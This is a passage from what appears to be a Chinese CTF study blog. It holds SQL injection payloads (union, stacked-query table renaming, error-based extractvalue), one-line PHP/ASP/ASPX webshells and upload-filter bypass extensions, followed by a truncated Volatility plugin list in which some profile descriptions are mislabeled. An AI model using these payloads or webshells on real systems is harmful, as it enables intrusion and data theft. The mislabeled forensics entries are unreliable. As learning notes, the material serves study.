&#x27;&#x27;,&#x27;&#x27;,group_concat(fl4g) from secret_table#</span><br></code></pre></td></tr></table></figure><h2 id="8-使用-LIMIT-获取特定数据"><a href="#8-使用-LIMIT-获取特定数据" class="headerlink" title="8. 使用 LIMIT 获取特定数据"></a>8. 使用 <code>LIMIT</code> 获取特定数据</h2><p>使用 <code>LIMIT</code> 获取特定数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,group_concat(fl4g) from secret_table limit 3,1#</span><br></code></pre></td></tr></table></figure><h2 id="9-改名操作"><a href="#9-改名操作" class="headerlink" title="9. 改名操作"></a>9. 改名操作</h2><p>猜测回显的数据库表字段，改变表名使回显到 <code>flag</code> 字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;alter table words rename words1; alter table `1919810931114514` rename words; alter table words change flag id varchar(100);#</span><br></code></pre></td></tr></table></figure><p>使用以下语句得到回显：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1;#</span><br></code></pre></td></tr></table></figure><h2 id="10-空格绕过"><a href="#10-空格绕过" class="headerlink" title="10. 空格绕过"></a>10. 空格绕过</h2><p>使用 <code>/**/</code> 代替空格或使用 <code>()</code>，<code>()</code> 两边不用空格：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">where</span>(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="11-报错注入"><a href="#11-报错注入" class="headerlink" title="11. 报错注入"></a>11. 报错注入</h2><h3 id="11-1-extractvalue-报错注入"><a href="#11-1-extractvalue-报错注入" class="headerlink" title="11.1 extractvalue() 报错注入"></a>11.1 <code>extractvalue()</code> 报错注入</h3><p><code>extractvalue()</code> 函数用于从XML文档中提取数据。通过构造错误的XPath表达式，可以触发报错并获取信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-number">0x7e</span>, database()));<br></code></pre></td></tr></table></figure><h3 id="11-2-为什么使用-0x7e"><a href="#11-2-为什么使用-0x7e" class="headerlink" title="11.2 为什么使用 0x7e"></a>11.2 为什么使用 <code>0x7e</code></h3><p><code>0x7e</code> 是ASCII码中的 <code>~</code> 符号，XPath语法不支持该符号，因此总能触发报错。其他不支持的字符如 <code>!</code> 也可以使用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-number">0x7e</span>, database()));<br></code></pre></td></tr></table></figure><h3 id="11-3-其他报错注入方法"><a href="#11-3-其他报错注入方法" class="headerlink" title="11.3 其他报错注入方法"></a>11.3 其他报错注入方法</h3><p>使用其他不支持的字符也可以达到同样的效果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-string">&#x27;!&#x27;</span>, database()));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一句话木马与文件头过滤</title>
    <link href="/2025/01/21/%E6%9C%A8%E9%A9%AC/"/>
    <url>/2025/01/21/%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="一句话木马与文件头过滤"><a href="#一句话木马与文件头过滤" class="headerlink" title="一句话木马与文件头过滤"></a>一句话木马与文件头过滤</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="PHP-一句话木马"><a href="#PHP-一句话木马" class="headerlink" title="PHP 一句话木马"></a>PHP 一句话木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[aaa]) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">// 短标签绕过 PHP</span><br></code></pre></td></tr></table></figure><h3 id="ASP-一句话木马"><a href="#ASP-一句话木马" class="headerlink" title="ASP 一句话木马"></a>ASP 一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">&lt;%eval request (&quot;pass&quot;)%&gt;<br></code></pre></td></tr></table></figure><h3 id="ASPX-一句话木马"><a href="#ASPX-一句话木马" class="headerlink" title="ASPX 一句话木马"></a>ASPX 一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;<br></code></pre></td></tr></table></figure><h3 id="PHP-另一种形式"><a href="#PHP-另一种形式" class="headerlink" title="PHP 另一种形式"></a>PHP 另一种形式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mochu7&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="文件头过滤"><a href="#文件头过滤" class="headerlink" title="文件头过滤"></a>文件头过滤</h2><h3 id="GIF89a"><a href="#GIF89a" class="headerlink" title="GIF89a"></a>GIF89a</h3><p>在文件开头添加 <code>GIF89a</code> 可以绕过一些文件头检测。</p><h2 id="可执行命令一句话"><a href="#可执行命令一句话" class="headerlink" title="可执行命令一句话"></a>可执行命令一句话</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>&lt;? @system($_GET[&quot;cc&quot;]); ?&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行 HTML</p><h2 id="文件后缀"><a href="#文件后缀" class="headerlink" title="文件后缀"></a>文件后缀</h2><p>以下是一些常见的文件后缀，可以用于绕过文件上传检测：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;.php&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;php1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.phtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pht&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;pHp1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ascx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ashx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aScx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aShx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cEr&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.sWf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.swf&quot;</span><br></code></pre></td></tr></table></figure><h2 id="PHP-解析配置"><a href="#PHP-解析配置" class="headerlink" title="PHP 解析配置"></a>PHP 解析配置</h2><p>PHP 文件需要在 Apache 的 <code>httpd.conf</code> 中有如下配置代码，才能正确解析：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AddType</span> application/x-httpd-php .php .phtml .phps .php5 .pht<br></code></pre></td></tr></table></figure><p>如果没有配置，访问时将会显示空白页。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vol取证</title>
    <link href="/2025/01/21/vol%E5%8F%96%E8%AF%811/"/>
    <url>/2025/01/21/vol%E5%8F%96%E8%AF%811/</url>
    
    <content type="html"><![CDATA[<p>rxnifbeiyomezpplugho</p><h1 id="vol取证代码"><a href="#vol取证代码" class="headerlink" title="vol取证代码"></a>vol取证代码</h1><h6 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h6><p>Volatility Foundation Volatility Framework 2.6</p><p> .&#x2F;volatility_2.6_lin64_standalone -f  文件名 imageinfo<br>.&#x2F;volatility_2.6_lin64_standalone  -f 文件名 –profile&#x3D;[操作系统] [插件参数]</p><h6 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h6><h2 id="Profiles"><a href="#Profiles" class="headerlink" title="Profiles"></a>Profiles</h2><p>VistaSP0x64           - Windows Vista SP0 x64 的配置文件<br>VistaSP0x86           - Windows Vista SP0 x86 的配置文件<br>VistaSP1x64           - Windows Vista SP1 x64 的配置文件<br>VistaSP1x86           - Windows Vista SP1 x86 的配置文件<br>VistaSP2x64           - Windows Vista SP1 x86 的配置文件<br>VistaSP2x86           - Windows Vista SP2 x64 的配置文件<br>Win10x64              - Windows 10 x64 的配置文件<br>Win10x64_10586        - Windows 10 x64 的配置文件 (10.0.10586.306 &#x2F; 2016-04-23)<br>Win10x64_14393        - Windows 10 x64 的配置文件 (10.0.14393.0 &#x2F; 2016-07-16)<br>Win10x86              - Windows 10 x86 的配置文件<br>Win10x86_10586        - Windows 10 x86 的配置文件 (10.0.10586.420 &#x2F; 2016-05-28)<br>Win10x86_14393        - Windows 10 x86 的配置文件 (10.0.14393.0 &#x2F; 2016-07-16)<br>Win2003SP0x86         - Windows 2003 SP0 x86 的配置文件<br>Win2003SP1x64         - Windows 2003 SP0 x86 的配置文件<br>Win2003SP1x86         - Windows 2003 SP1 x86 的配置文件<br>Win2003SP2x64         - Windows 2003 SP1 x86 的配置文件<br>Win2003SP2x86         - Windows 2003 SP2 x86 的配置文件<br>Win2008R2SP0x64       - Windows 2008 R2 SP0 x64 的配置文件<br>Win2008R2SP1x64       - Windows 2008 R2 SP1 x64 的配置文件<br>Win2008R2SP1x64_23418 - Windows 2008 R2 SP1 x64 的配置文件 (6.1.7601.23418 &#x2F; 2016-04-09)<br>Win2008SP1x64         - Windows 2008 SP1 x64 的配置文件<br>Win2008SP1x86         - Windows 2008 SP1 x86 的配置文件<br>Win2008SP2x64         - Windows 2008 SP2 x64 的配置文件<br>Win2008SP2x86         - Windows 2008 SP2 x86 的配置文件<br>Win2012R2x64          - Windows Server 2012 R2 x64 的配置文件<br>Win2012R2x64_18340    - Windows Server 2012 R2 x64 的配置文件 (6.3.9600.18340 &#x2F; 2016-05-13)<br>Win2012x64            - Windows Server 2012 x64 的配置文件<br>Win2016x64_14393      - Windows Server 2016 x64 的配置文件 (10.0.14393.0 &#x2F; 2016-07-16)<br>Win7SP0x64            - Windows 7 SP0 x64 的配置文件<br>Win7SP0x86            - Windows 7 SP0 x86 的配置文件<br>Win7SP1x64            - Windows 7 SP1 x64 的配置文件<br>Win7SP1x64_23418      - Windows 7 SP1 x64 的配置文件 (6.1.7601.23418 &#x2F; 2016-04-09)<br>Win7SP1x86            - Windows 7 SP1 x86 的配置文件<br>Win7SP1x86_23418      - Windows 7 SP1 x86 的配置文件 (6.1.7601.23418 &#x2F; 2016-04-09)<br>Win81U1x64            - Windows 8.1 更新 1 x64 的配置文件<br>Win81U1x86            - Windows 8.1 更新 1 x86 的配置文件<br>Win8SP0x64            - Windows 8 x64 的配置文件<br>Win8SP0x86            - Windows 8 x86 的配置文件<br>Win8SP1x64            - Windows 8.1 x64 的配置文件<br>Win8SP1x64_18340      - Windows 8.1 x64 的配置文件 (6.3.9600.18340 &#x2F; 2016-05-13)<br>Win8SP1x86            - Windows 8.1 x86 的配置文件<br>WinXPSP1x64           - Windows XP SP1 x64 的配置文件<br>WinXPSP2x64           - Windows XP SP2 x64 的配置文件<br>WinXPSP2x86           - Windows XP SP2 x86 的配置文件<br>WinXPSP3x86           - Windows XP SP3 x86 的配置文件</p><h2 id="Address-Spaces"><a href="#Address-Spaces" class="headerlink" title="Address Spaces"></a>Address Spaces</h2><p>AMD64PagedMemory              - 标准 AMD 64 位地址空间<br>ArmAddressSpace               - ARM 处理器的地址空间<br>FileAddressSpace              - 这是一个直接文件 AS.<br>HPAKAddressSpace              - 此 AS 支持 HPAK 格式<br>IA32PagedMemory               - 标准 IA-32 分页地址空间<br>IA32PagedMemoryPae            - 此类实现 IA-32 PAE 分页地址空间<br>LimeAddressSpace              - Lime 的地址空间<br>LinuxAMD64PagedMemory         - Linux 特定的 AMD 64 位地址空间<br>MachOAddressSpace             - mach-o 文件的地址空间以支持 atc-ny 内存读取器<br>OSXPmemELF                    - 这个 AS 支持 VirtualBox ELF64 coredump 格式<br>QemuCoreDumpElf               - 这个 AS 支持 Qemu ELF32 和 ELF64 核心转储格式<br>VMWareAddressSpace            - 此 AS 支持 VMware 快照 (VMSS) 和保存状态 (VMSS) 文件<br>VMWareMetaAddressSpace        - 此 AS 支持带有 VMSN&#x2F;VMSS 元数据的 VMEM 格式<br>VirtualBoxCoreDumpElf64       - 这个 AS 支持 VirtualBox ELF64 coredump 格式<br>Win10AMD64PagedMemory         - Windows 10 特定的 AMD 64 位地址空间<br>WindowsAMD64PagedMemory       - Windows 特定的 AMD 64 位地址空间<br>WindowsCrashDumpSpace32       - 这个 AS 支持 windows 崩溃转储格式<br>WindowsCrashDumpSpace64       - 此 AS 支持 windows Crash Dump 格式<br>WindowsCrashDumpSpace64BitMap - 此 AS 支持 Windows BitMap Crash Dump 格式<br>WindowsHiberFileSpace32       - 这是 Windows 休眠文件的休眠地址空间</p><h2 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h2><p>amcache                    - 打印 AmCache 信息<br>apihooks                   - 检测进程和内核内存中的 API 挂钩<br>atoms                      - 打印会话和窗口站原子表<br>atomscan                   - 原子表的池扫描器<br>auditpol                   - 从 HKLM\SECURITY\Policy\PolAdtEv 打印出审计策略<br>bigpools                   - 使用 BigPagePoolScanner 转储大页面池<br>bioskbd                    - 从实模式内存中读取键盘缓冲区<br>cachedump                  - 从内存中转储缓存的域哈希<br>callbacks                  - 打印系统范围的通知例程<br>clipboard                  - 提取 Windows 剪贴板的内容<br>cmdline                    - 显示进程命令行参数<br>cmdscan                    - 通过扫描 _COMMAND_HISTORY 来提取命令历史记录<br>connections                - 打印打开的连接列表 [仅限 Windows XP 和 2003]<br>connscan                   - 用于 tcp 连接的池扫描器<br>consoles                   - 通过扫描 _CONSOLE_INFORMATION 提取命令历史记录<br>crashinfo                  - 转储崩溃转储信息<br>deskscan                   - tagDESKTOP（台式机）的 Poolscaner<br>devicetree                 - 显示设备树<br>dlldump                    - 从进程地址空间转储 DLL<br>dlllist                    - 打印每个进程加载的 dll 列表<br>driverirp                  - 驱动程序 IRP 挂钩检测<br>drivermodule               - 将驱动程序对象关联到内核模块<br>driverscan                 - 驱动程序对象的池扫描器<br>dumpcerts                  - 转储 RSA 私有和公共 SSL 密钥<br>dumpfiles                  - 提取内存映射和缓存文件<br>dumpregistry               - 将注册表文件转储到磁盘<br>editbox                    - 显示有关编辑控件的信息（列表框实验）<br>envars                     - 显示进程环境变量<br>eventhooks                 - 在 Windows 事件挂钩上打印详细信息<br>evtlogs                    - 提取 Windows 事件日志（仅限 XP&#x2F;2003）<br>filescan                   - 文件对象的池扫描器<br>gahti                      - 转储 USER 句柄类型信息<br>gditimers                  - 打印已安装的 GDI 计时器和回调<br>gdt                        - 显示全局描述符表<br>getservicesids             - 获取 Registry 中的服务名称并返回计算的 SID<br>getsids                    - 打印拥有每个进程的 SID<br>handles                    - 打印每个进程的打开句柄列表<br>hashdump                   - 从内存中转储密码哈希 (LM&#x2F;NTLM)<br>hibinfo                    - 转储休眠文件信息<br>hivedump                   - 打印注册表<br>hivelist                   - 打印注册表配置单元列表<br>hivescan                   - 注册表配置单元的池扫描程序<br>hpakextract                - 从 HPAK 文件中提取物理内存<br>hpakinfo                   - 有关 HPAK 文件的信息<br>idt                        - 显示中断描述符表<br>iehistory                  - 重建 Internet Explorer 缓存&#x2F;历史<br>imagecopy                  - 将物理地址空间复制为原始 DD 映像<br>imageinfo                  - 识别图像的信息<br>impscan                    - 扫描对导入函数的调用<br>joblinks                   - 打印进程作业链接信息<br>kdbgscan                   - 搜索和转储潜在的 KDBG 值<br>kpcrscan                   - 搜索和转储潜在的 KPCR 值<br>ldrmodules                 - 检测未链接的 DLL<br>limeinfo                   - 转储 Lime 文件格式信息<br>linux_apihooks             - 检查用户态 apihooks<br>linux_arp                  - 打印 ARP 表<br>linux_aslr_shift           - 自动检测 Linux ASLR shift<br>linux_banner               - 打印 Linux 横幅信息<br>linux_bash                 - 从 bash 进程内存中恢复 bash 历史记录<br>linux_bash_env             - 恢复进程的动态环境变量<br>linux_bash_hash            - 从 bash 进程内存中恢复 bash 哈希表<br>linux_check_afinfo         - 验证网络协议的操作函数指针<br>linux_check_creds          - 检查是否有进程共享凭证结构<br>linux_check_evt_arm        - 检查异常向量表以查找系统调用表挂钩<br>linux_check_fop            - 检查 rootkit 修改的文件操作结构<br>linux_check_idt            - 检查 IDT 是否已被更改<br>linux_check_inline_kernel  - 检查内联内核挂钩<br>linux_check_modules        - 将模块列表与 sysfs 信息进行比较（如果可用）<br>linux_check_syscall        - 检查系统调用表是否已更改<br>linux_check_syscall_arm    - 检查系统调用表是否已更改<br>linux_check_tty            - 检查 tty 设备的钩子<br>linux_cpuinfo              - 打印每个活动处理器的信息<br>linux_dentry_cache         - 从 dentry 缓存中收集文件<br>linux_dmesg                - 收集 dmesg 缓冲区<br>linux_dump_map             - 将选定的内存映射写入磁盘<br>linux_dynamic_env          - 恢复进程的动态环境变量<br>linux_elfs                 - 在进程映射中查找 ELF 二进制文件<br>linux_enumerate_files      - 列出文件系统缓存引用的文件<br>linux_find_file            - 列出并从内存中恢复文件<br>linux_getcwd               - 列出每个进程的当前工作目录<br>linux_hidden_modules       - 雕刻内存以查找隐藏的内核模块<br>linux_ifconfig             - 收集活动接口<br>linux_info_regs            - 就像 GDB 中的“信息寄存器”。 它打印出所有<br>linux_iomem                - 提供类似于 &#x2F;proc&#x2F;iomem 的输出<br>linux_kernel_opened_files  - 列出从内核中打开的文件<br>linux_keyboard_notifiers   - 解析键盘通知器调用链<br>linux_ldrmodules           - 将 proc 映射的输出与 libdl 中的库列表进行比较<br>linux_library_list         - 列出加载到进程中的库<br>linux_librarydump          - 将进程内存中的共享库转储到磁盘<br>linux_list_raw             - 列出具有混杂套接字的应用程序<br>linux_lsmod                - 收集加载的内核模块<br>linux_lsof                 - 列出文件描述符及其路径<br>linux_malfind              - 寻找可疑的进程映射<br>linux_memmap               - 转储 linux 任务的内存映射<br>linux_moddump              - 提取加载的内核模块<br>linux_mount                - 收集挂载的 fs&#x2F;devices<br>linux_mount_cache          - 从 kmem_cache收集挂载的 fs&#x2F;devices<br>linux_netfilter            - 列出 Netfilter 钩子<br>linux_netscan              - 雕刻网络连接结构<br>linux_netstat              - 列出打开的套接字<br>linux_pidhashtable         - 通过 PID 哈希表枚举进程<br>linux_pkt_queues           - 将每个进程的数据包队列写入磁盘<br>linux_plthook              - 扫描 ELF 二进制文件的 PLT 以获取非需要图像的挂钩<br>linux_proc_maps            - 收集进程内存映射<br>linux_proc_maps_rb         - 通过映射红黑树为 linux 收集进程映射<br>linux_procdump             - 将进程的可执行映像转储到磁盘<br>linux_process_hollow       - 检查进程空心的迹象<br>linux_psaux                - 收集进程以及完整的命令行和开始时间<br>linux_psenv                - 收集进程及其静态环境变量<br>linux_pslist               - 通过遍历 task_struct-&gt;task 列表来收集活动任务<br>linux_pslist_cache         - 从 kmem_cache 收集任务<br>linux_psscan               - 扫描进程的物理内存<br>linux_pstree               - 显示进程之间的父&#x2F;子关系<br>linux_psxview              - 使用各种进程列表查找隐藏进程<br>linux_recover_filesystem   - 从内存中恢复整个缓存文件系统<br>linux_route_cache          - 从内存中恢复路由缓存<br>linux_sk_buff_cache        - 从 sk_buff kmem_cache 中恢复数据包<br>linux_slabinfo             - 在运行的机器上模拟 &#x2F;proc&#x2F;slabinfo<br>linux_strings              - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）<br>linux_threads              - 打印进程的线程<br>linux_tmpfs                - 从内存中恢复 tmpfs 文件系统<br>linux_truecrypt_passphrase - 恢复缓存的 Truecrypt 密码<br>linux_vma_cache            - 从 vm_area_struct 缓存中收集 VMA<br>linux_volshell             - 内存映像中的 Shell<br>linux_yarascan             - Linux 内存映像中的 shell<br>lsadump                    - 从注册表中转储（解密的）LSA 机密<br>mac_adium                  - 列出 Adium 消息<br>mac_apihooks               - 检查进程中的 API 挂钩<br>mac_apihooks_kernel        - 检查系统调用和内核函数是否被挂钩<br>mac_arp                    - 打印 arp 表<br>mac_bash                   - 从 bash 进程内存中恢复 bash 历史记录<br>mac_bash_env               - 恢复 bash 的环境变量<br>mac_bash_hash              - 从 bash 进程内存中恢复 bash 哈希表<br>mac_calendar               - 从 Calendar.app 获取日历事件<br>mac_check_fop              - 验证文件操作指针<br>mac_check_mig_table        - 列出内核 MIG 表中的整体<br>mac_check_syscall_shadow   - 查找影子系统调用表<br>mac_check_syscalls         - 检查系统调用表条目是否被挂钩<br>mac_check_sysctl           - 检查未知的 sysctl 处理程序<br>mac_check_trap_table       - 检查 mach 陷阱表条目是否被钩住<br>mac_compressed_swap        - 打印 Mac OS X VM 压缩器统计数据并转储所有压缩页面<br>mac_contacts               - 从 Contacts.app 获取联系人姓名<br>mac_dead_procs             - 打印终止&#x2F;取消分配的进程<br>mac_dead_sockets           - 打印终止&#x2F;取消分配的网络套接字<br>mac_dead_vnodes            - 列出释放的 vnode 结构<br>mac_devfs                  - 列出文件缓存中的文件<br>mac_dmesg                  - 打印内核调试缓冲区<br>mac_dump_file              - 转储指定文件<br>mac_dump_maps              - 转储进程的内存范围，可选地包括压缩交换中的页面<br>mac_dyld_maps              - 从 dyld 数据结构中获取进程的内存映射<br>mac_find_aslr_shift        - 查找 10.8+ 图像的 ASLR 移位值<br>mac_get_profile            - 自动检测 Mac 配置文件<br>mac_ifconfig               - 列出所有设备的网络接口信息<br>mac_interest_handlers      - 列出 IOKit 兴趣处理程序<br>mac_ip_filters             - 报告任何挂钩的 IP 过滤器<br>mac_kernel_classes         - 列出内核中加载的 c++ 类<br>mac_kevents                - 显示进程的父&#x2F;子关系<br>mac_keychaindump           - 恢复可能的钥匙串密钥。 使用chainbreaker打开相关的keychain文件<br>mac_ldrmodules             - 将 proc 映射的输出与 libdl 中的库列表进行比较<br>mac_librarydump            - 转储进程的可执行文件<br>mac_list_files             - 列出文件缓存中的文件<br>mac_list_kauth_listeners   - 列出 Kauth Scope 监听器<br>mac_list_kauth_scopes      - 列出 Kauth 范围及其状态<br>mac_list_raw               - 列出具有混杂套接字的应用程序<br>mac_list_sessions          - 枚举会话<br>mac_list_zones             - 打印活动区域<br>mac_lsmod                  - 列出加载的内核模块<br>mac_lsmod_iokit            - 列出通过 IOkit 加载的内核模块<br>mac_lsmod_kext_map         - 列出加载的内核模块<br>mac_lsof                   - 列出每个进程打开的文件<br>mac_machine_info           - 打印有关样本的机器信息<br>mac_malfind                - 寻找可疑的进程映射<br>mac_memdump                - 将可寻址内存页转储到文件中<br>mac_moddump                - 将指定的内核扩展写入磁盘<br>mac_mount                  - 打印挂载的设备信息<br>mac_netstat                - 列出每个进程的活动网络连接<br>mac_network_conns          - 列出来自内核网络结构的网络连接<br>mac_notesapp               - 查找 Notes 消息的内容<br>mac_notifiers              - 检测将钩子添加到 I&#x2F;O 工具包中的 rootkit（例如 LogKext）<br>mac_orphan_threads         - 列出不映射回已知模块&#x2F;进程的线程<br>mac_pgrp_hash_table        - 遍历进程组哈希表<br>mac_pid_hash_table         - 遍历 pid 哈希表<br>mac_print_boot_cmdline     - 打印内核启动参数<br>mac_proc_maps              - 获取进程的内存映射<br>mac_procdump               - 转储进程的可执行文件<br>mac_psaux                  - 在用户区打印带有参数的进程 (**argv)<br>mac_psenv                  - 在用户空间打印带有环境的进程 (**envp)<br>mac_pslist                 - 列出正在运行的进程<br>mac_pstree                 - 显示进程的父&#x2F;子关系<br>mac_psxview                - 使用各种进程列表查找隐藏进程<br>mac_recover_filesystem     - 恢复缓存的文件系统<br>mac_route                  - 打印路由表<br>mac_socket_filters         - 报告套接字过滤器<br>mac_strings                - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）<br>mac_tasks                  - 列出活动任务<br>mac_threads                - 列出进程线程<br>mac_threads_simple         - 列出线程及其开始时间和优先级<br>mac_timers                 - 报告内核驱动程序设置的定时器<br>mac_trustedbsd             - 列出恶意的trustedbsd 策略<br>mac_version                - 打印 Mac 版本<br>mac_vfsevents              - 列出过滤文件系统事件的进程<br>mac_volshell               - 内存映像中的外壳<br>mac_yarascan               - 扫描内存中的 